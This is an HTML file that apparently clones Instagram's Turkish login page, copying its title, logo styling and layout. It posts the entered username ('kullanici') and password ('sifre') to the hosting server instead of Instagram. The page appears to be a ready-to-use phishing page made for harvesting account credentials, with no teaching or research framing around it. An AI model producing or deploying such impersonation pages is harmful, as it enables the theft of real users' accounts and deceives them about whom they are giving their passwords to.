<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş • Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #fafafa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .wrapper { display: flex; flex-direction: column; align-items: center; }
        .card {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px;
            width: 350px;
            margin-bottom: 10px;
        }
        .logo-text {
            text-align: center;
            font-family: 'Billabong', cursive, 'Segoe UI';
            font-size: 40px;
            margin-bottom: 24px;
            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .form-group { margin-bottom: 6px; position: relative; }
        .form-group input {
            width: 100%;
            padding: 9px 8px 7px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
            font-size: 12px;
            outline: none;
        }
        .form-group input:focus {
            border-color: #a8a8a8;
        }
        .btn-login {
            width: 100%;
            padding: 7px;
            background: #0095f6;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 14px;
            transition: background 0.2s;
        }
        .btn-login:hover { background: #1877f2; }
        .separator {
            display: flex;
            align-items: center;
            margin: 18px 0;
        }
        .separator hr {
            flex: 1;
            border: none;
            border-top: 1px solid #dbdbdb;
        }
        .separator span {
            padding: 0 16px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        .forgot-link {
            display: block;
            text-align: center;
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            margin-top: 16px;
        }
        .signup-card {
            background: #fff;
            border: 1px solid #dbdbdb;
            padding: 22px 0;
            width: 350px;
            text-align: center;
            font-size: 14px;
        }
        .signup-card a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="card">
            <div class="logo-text">Instagram</div>
            <form action="/" method="post">
                <div class="form-group">
                    <input type="text" name="kullanici" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
                </div>
                <div class="form-group">
                    <input type="password" name="sifre" placeholder="Şifre" required>
                </div>
                <button type="submit" class="btn-login">Giriş yap</button>
            </form>
            <div class="separator">
                <hr><span>YA DA</span><hr>
            </div>
            <a href="#" class="forgot-link">Şifreni mi unuttun?</a>
        </div>
        <div class="signup-card">
            Hesabın yok mu? <a href="#">Kaydol</a>
        </div>
    </div>
</body>
</html>
